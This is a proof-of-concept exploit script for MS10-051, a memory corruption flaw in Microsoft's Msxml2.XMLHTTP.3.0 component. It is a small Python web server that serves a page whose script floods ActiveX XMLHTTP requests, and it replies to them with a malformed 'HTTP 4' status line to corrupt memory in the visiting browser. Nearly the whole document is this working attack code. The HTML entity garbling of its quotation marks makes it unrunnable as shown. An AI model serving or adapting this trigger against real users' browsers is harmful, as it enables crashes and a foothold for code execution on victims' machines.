Msxml2.XMLHTTP.3.0 Response Handling Memory Corruption (MS10-051)
=================================================================

# Sources:
# http://skypher.com/index.php/2010/08/10/ms10-051/
# http://code.google.com/p/skylined/issues/detail?id=17
#
import os, re, socket;
webserver_port = 28876;
 
replies = {
  r&#039;^/$&#039;: (&#039;text/html&#039;, """
<SCRIPT>
  iCounter = 0
  function go() {
    var request_url = location.protocol + "//" + location.host + "/RandomHTTP?counter=" + (iCounter++);
    var xml_http_request = new ActiveXObject("Msxml2.XMLHTTP.3.0");
    xml_http_request.open("GET", request_url, false);
    xml_http_request.send();
    setTimeout(go, 1);
  }
  go();
</SCRIPT>
"""),
  r&#039;^/RandomHTTP\?counter=\d+$&#039;: &#039;HTTP 4\n&#039;,
};
 
server_socket = socket.socket();
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);
server_socket.bind((&#039;&#039;, webserver_port));
server_socket.listen(1);
print &#039;Webserver running at http://localhost:%d/&#039; % webserver_port;
 
while 1:
  client_socket,_ = server_socket.accept();
  try:
    request = client_socket.recv(1024);
  except socket.error, e:
    print &#039;>> ??&#039;;
    continue;
  print &#039;>> &#039; + request.split(&#039;\r\n&#039;)[0];
  path = None;
  if request[:4] == &#039;GET &#039;:
    end_path = request.find(&#039; &#039;, 4);
    if end_path != -1:
      path = request[4:end_path];
  code, reason, mime_type, body = 404, &#039;Not found&#039;, &#039;text/plain&#039;, &#039;Not found&#039;;
  response = None;
  if path is not None:
    for path_regexp in replies.keys():
      if re.match(path_regexp, path):
        if type(replies[path_regexp]) == str:
          response = replies[path_regexp];
        elif type(replies[path_regexp]) == tuple:
          code, reason = 200, &#039;OK&#039;;
          mime_type, body = replies[path_regexp];
        else:
          code, reason, mime_type, body = replies[path_regexp](path);
        break;
  if response is None:
    response = &#039;\r\n&#039;.join([
      &#039;HTTP/1.1 %03d %s&#039; % (code, reason),
      &#039;Content-Type: %s&#039; % mime_type,
      &#039;Date: Sat Aug 28 1976 09:15:00 GMT&#039;,
      &#039;Expires: Sat Aug 28 1976 09:15:00 GMT&#039;,
      &#039;Cache-Control: no-cache, must-revalidate&#039;,
      &#039;Pragma: no-cache&#039;,
      &#039;Accept-Ranges: bytes&#039;,
      &#039;Content-Length: %d&#039; % len(body),
      &#039;&#039;,
      body
    ]);
  print &#039;<< %s (%d bytes %s)&#039; % \
      (response.split(&#039;\r\n&#039;)[0], len(response), mime_type);
  try:
    client_socket.send(response);
  except socket.error, e:
    pass;
  client_socket.close();



